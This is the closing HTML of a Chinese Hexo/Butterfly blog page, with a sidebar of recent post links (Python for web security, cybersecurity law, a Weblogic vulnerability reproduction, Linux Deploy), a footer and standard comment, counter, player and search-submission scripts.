href="/2021/05/26/Web%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E4%B9%8Bpython/" title="Web白帽子学习之python">Web白帽子学习之python</a><time datetime="2021-07-21T11:47:46.518Z" title="更新于 2021-07-21 19:47:46">2021-07-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/30/%E3%80%90%E5%BF%85%E7%9C%8B%E3%80%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/" title="【必读】网络安全法"><img src="https://i.loli.net/2021/06/30/aME6UL9Kito5Ixq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【必读】网络安全法"/></a><div class="content"><a class="title" href="/2021/06/30/%E3%80%90%E5%BF%85%E7%9C%8B%E3%80%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/" title="【必读】网络安全法">【必读】网络安全法</a><time datetime="2021-07-19T14:41:30.226Z" title="更新于 2021-07-19 22:41:30">2021-07-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/19/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Weblogic10.3.6漏洞复现"><img src="https://i.loli.net/2021/07/19/1G8RfFL9JhYPyTn.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Weblogic10.3.6漏洞复现"/></a><div class="content"><a class="title" href="/2021/07/19/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Weblogic10.3.6漏洞复现">Weblogic10.3.6漏洞复现</a><time datetime="2021-07-19T14:37:08.638Z" title="更新于 2021-07-19 22:37:08">2021-07-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/26/LinuxDeploy%E5%AE%89%E8%A3%85Centos/" title="Linux Deploy安装Centos"><img src="https://i.loli.net/2021/06/28/85JkjqeviTBGXyY.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux Deploy安装Centos"/></a><div class="content"><a class="title" href="/2021/06/26/LinuxDeploy%E5%AE%89%E8%A3%85Centos/" title="Linux Deploy安装Centos">Linux Deploy安装Centos</a><time datetime="2021-07-19T14:31:37.938Z" title="更新于 2021-07-19 22:31:37">2021-07-19</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://i.loli.net/2020/11/09/A9IgHFYfoUxyTP7.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Shawn</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">相见即是缘分，少年！有空常来啊...</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><div class="js-pjax"><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    $.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js', function () {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'default',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'gQCglyv92NlaWrGjAf1ANbbf-MdYXbMMI',
+      appKey: 'VxmLj0u0vjDuqJ5cHMH1w5CT',
+      placeholder: '少年！都到这儿了不留下点什么吗！！',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="https://myhkw.cn/player/js/player.js" id="myhk" key="161172509791" m="1"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
